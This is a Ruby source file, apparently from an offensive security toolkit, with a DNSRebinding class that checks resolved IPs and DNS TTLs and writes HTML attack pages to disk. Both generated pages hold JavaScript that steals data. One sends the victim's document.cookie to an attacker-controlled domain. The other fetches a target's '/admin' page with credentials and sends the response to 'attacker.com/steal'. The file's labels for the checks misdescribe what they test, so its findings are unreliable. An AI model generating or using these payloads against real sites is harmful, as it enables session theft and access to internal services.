require 'resolv'
require 'net/http'
require 'uri'
require_relative '../utils/colorize'

class DNSRebinding
  def self.test_dns_rebinding(target_domain, attacker_domain)
    begin
      resolver = Resolv::DNS.new
      
      attacker_ip = resolver.getaddress(attacker_domain)
      target_ip = resolver.getaddress(target_domain)
      
      puts Colorize.yellow("Attacker domain IP: #{attacker_ip}")
      puts Colorize.yellow("Target domain IP: #{target_ip}")
      
      if attacker_ip != target_ip
        puts Colorize.green("DNS rebinding possible - different IPs")
        return { possible: true, attacker_ip: attacker_ip.to_s, target_ip: target_ip.to_s }
      else
        puts Colorize.red("DNS rebinding not possible - same IPs")
        return { possible: false }
      end
    rescue => e
      puts Colorize.red("Error: #{e.message}")
      return { possible: false, error: e.message }
    end
  end

  def self.generate_payload(target_ip, attacker_domain)
    payload = <<~HTML
      <html>
      <head>
        <script>
          var target = '#{target_ip}';
          var attacker = '#{attacker_domain}';
          
          function rebind() {
            var img = new Image();
            img.onerror = function() {
              var xhr = new XMLHttpRequest();
              xhr.open('GET', 'http://' + attacker + '/steal?data=' + document.cookie, true);
              xhr.send();
            };
            img.src = 'http://' + target + '/admin';
          }
          
          setTimeout(rebind, 2000);
        </script>
      </head>
      <body>
        <h1>DNS Rebinding Attack</h1>
        <p>This page will attempt to access internal resources.</p>
      </body>
      </html>
    HTML
    
    filename = "dns_rebinding_#{Time.now.to_i}.html"
    File.write(filename, payload)
    puts Colorize.green("Payload saved: #{filename}")
    filename
  end

  def self.test_ttl_manipulation(domain)
    begin
      resolver = Resolv::DNS.new
      resource = resolver.getresource(domain, Resolv::DNS::Resource::IN::A)
      
      if resource
        ttl = resource.ttl
        puts Colorize.yellow("TTL for #{domain}: #{ttl} seconds")
        
        if ttl < 60
          puts Colorize.red("Low TTL detected - DNS rebinding easier")
          return { ttl: ttl, vulnerable: true }
        else
          puts Colorize.green("High TTL - DNS rebinding harder")
          return { ttl: ttl, vulnerable: false }
        end
      end
    rescue => e
      return { error: e.message }
    end
  end

  def self.test_browser_cache_poisoning(target_domain)
    payload = <<~HTML
      <html>
      <head>
        <script>
          var target = '#{target_domain}';
          
          function poison() {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://' + target + '/admin', true);
            xhr.withCredentials = true;
            xhr.onreadystatechange = function() {
              if (xhr.readyState === 4) {
                var data = xhr.responseText;
                var img = new Image();
                img.src = 'http://attacker.com/steal?data=' + encodeURIComponent(data);
              }
            };
            xhr.send();
          }
          
          setTimeout(poison, 1000);
        </script>
      </head>
      <body>
        <h1>Browser Cache Poisoning</h1>
      </body>
      </html>
    HTML
    
    filename = "cache_poisoning_#{Time.now.to_i}.html"
    File.write(filename, payload)
    puts Colorize.green("Payload saved: #{filename}")
    filename
  end
end

